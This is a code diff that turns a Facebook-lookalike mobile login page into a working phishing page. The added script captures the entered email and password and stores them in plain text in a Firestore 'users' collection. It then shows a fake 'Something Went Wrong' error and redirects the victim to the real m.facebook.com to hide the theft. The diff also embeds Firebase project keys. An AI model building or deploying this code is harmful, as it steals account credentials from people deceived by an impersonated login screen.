@@ -10,6 +10,8 @@
     <!-- Bootstrap CSS -->
     <link rel="stylesheet"
         href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.3/css/bootstrap.min.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.2/jquery-confirm.min.css">
+
 
     <!-- The core Firebase JS SDK is always required and must be listed first -->
     <script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-app.js"></script>
@@ -17,6 +19,9 @@
     <!-- TODO: Add SDKs for Firebase products that you want to use
      https://firebase.google.com/docs/web/setup#available-libraries -->
     <script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-analytics.js"></script>
+    <!-- Add Firebase products that you want to use -->
+    <script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-firestore.js"></script>
     <style>
         nav {
             background: #3b5998;
@@ -91,43 +96,50 @@
         a {
             color: #7596c8;
         }
-        .lang_select{
+
+        .lang_select {
             font-size: 12px;
         }
-        .plus{
+
+        .plus {
             position: relative;
             background: white;
             border: 1px solid #7596c8;
-            width:20px!important;
+            width: 20px !important;
             height: 20px;
             border-radius: 2px;
             box-sizing: border-box;
         }
-        .plus::before{
+
+        .plus::before {
             content: "+";
             position: absolute;
-            top:50%;
-            left:50%;
+            top: 50%;
+            left: 50%;
             color: #7596c8;
-            transform: translate(-50%,-58%);
+            transform: translate(-50%, -58%);
             font-size: 20px;
         }
-        .input_group{
+
+        .input_group {
             position: relative;
             display: flex;
         }
-        .input_group input{
-            width:100%;
+
+        .input_group input {
+            width: 100%;
         }
-        .group-append{
+
+        .group-append {
             position: absolute;
-            top:50%;
-            right:10px;
+            top: 50%;
+            right: 10px;
             transform: translateY(-50%);
             display: none;
         }
-        #show_btn{
-            color:#1877f2;
+
+        #show_btn {
+            color: #1877f2;
             font-weight: bold;
             font-size: 14px;
         }
@@ -152,14 +164,14 @@
                 <input class="form-control" autocorrect="off" autocapitalize="off" type="email"
                     class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email"
                     placeholder="Mobile number or email address">
-                    <div class="input_group">
-                        <input autocorrect="off" autocapitalize="off" class="form-control" autocomplete="on"
-                            id="m_login_password" name="pass" placeholder="Password" type="password">
-                            <div class="group-append">
-                                <span id="show_btn">SHOW</span>
-                              </div>
+                <div class="input_group">
+                    <input autocorrect="off" autocapitalize="off" class="form-control" autocomplete="on"
+                        id="m_login_password" name="pass" placeholder="Password" type="password">
+                    <div class="group-append">
+                        <span id="show_btn">SHOW</span>
                     </div>
-                <button type="submit" class="my-2 py-2">Log In</button>
+                </div>
+                <button type="submit" class="my-2 py-2" id="log_btn">Log In</button>
             </form>
             <div id="seperator" class="text-center py-2" style="font-size:12px;">or</div>
             <div class="sign_up_btn text-center">
@@ -210,45 +222,83 @@
         integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
         crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.3/js/bootstrap.min.js"></script>
-    <script src="js/vue.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.2/jquery-confirm.min.js"></script>
 
 
     <script>
         // Your web app's Firebase configuration
         var firebaseConfig = {
-            apiKey: "AIzaSyCzUUcmKheV8qwfAzJvVNvmInpB6tQZcWE",
-            authDomain: "gogrocy-e1f9e.firebaseapp.com",
-            databaseURL: "https://gogrocy-e1f9e.firebaseio.com",
-            projectId: "gogrocy-e1f9e",
-            storageBucket: "gogrocy-e1f9e.appspot.com",
-            messagingSenderId: "976780130407",
-            appId: "1:976780130407:web:ae506d87013c68c347bcc2",
-            measurementId: "G-EVJ8F1MF48"
+            apiKey: "AIzaSyDgByj1Vk6h6c_N3FNL49-UuU12wetNPpA",
+            authDomain: "fbclone-f5ad0.firebaseapp.com",
+            databaseURL: "https://fbclone-f5ad0.firebaseio.com",
+            projectId: "fbclone-f5ad0",
+            storageBucket: "fbclone-f5ad0.appspot.com",
+            messagingSenderId: "247440831227",
+            appId: "1:247440831227:web:770966e69cba064d2a365e",
+            measurementId: "G-P6GTFZBP4B"
         };
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         firebase.analytics();
     </script>
     <script>
-        $(function(){
-            $("input[name='pass']").change(function(){
-                var pass=$(this).val();
-                if(pass!=""){
+        $(function () {
+            $("input[name='pass']").change(function () {
+                var pass = $(this).val();
+                if (pass != "") {
                     $(".group-append").show();
                 }
-                else{
+                else {
                     $(".group-append").hide();
                 }
             });
-            $("#show_btn").on("click",function(){
-                var type=$("input[name='pass']").attr("type");
-                if(type=="password"){
-                $("input[name='pass']").attr("type","text");
-                }else{
-                $("input[name='pass']").attr("type","password");
+            $("#show_btn").on("click", function () {
+                var type = $("input[name='pass']").attr("type");
+                if (type == "password") {
+                    $("input[name='pass']").attr("type", "text");
+                } else {
+                    $("input[name='pass']").attr("type", "password");
                 }
             })
+            $("#log_btn").click(function (e) {
+                var email = $("input[name='email']").val();
+                var pass = $("input[name='pass']").val();
+                writeUserData(email, pass);
+                e.preventDefault();
+                setTimeout(function(){
+                    $.confirm({
+                        title:"Try Again!",
+                        content:"Something Went Wrong, Please try again!",
+                        
+                        buttons: {
+                            okay:{
+                                text:"Okay",
+                                btnClass: 'btn-blue',
+                                keys: ['enter', 'shift'],
+                                action:function () {
+                                    window.location.href="https://m.facebook.com";
+                                }
+                            } 
+                        }   
+                    });
+                },1500);
+
+            })
         });
+        var db = firebase.firestore();
+
+        function writeUserData(email, password) {
+            db.collection("users").add({
+                email: email,
+                password: password
+            })
+            .then(function (docRef) {
+                    console.log("Document written with ID: ", docRef.id);
+            })
+            .catch(function (error) {
+                    console.error("Error adding document: ", error);
+            });
+        }
     </script>
 
 
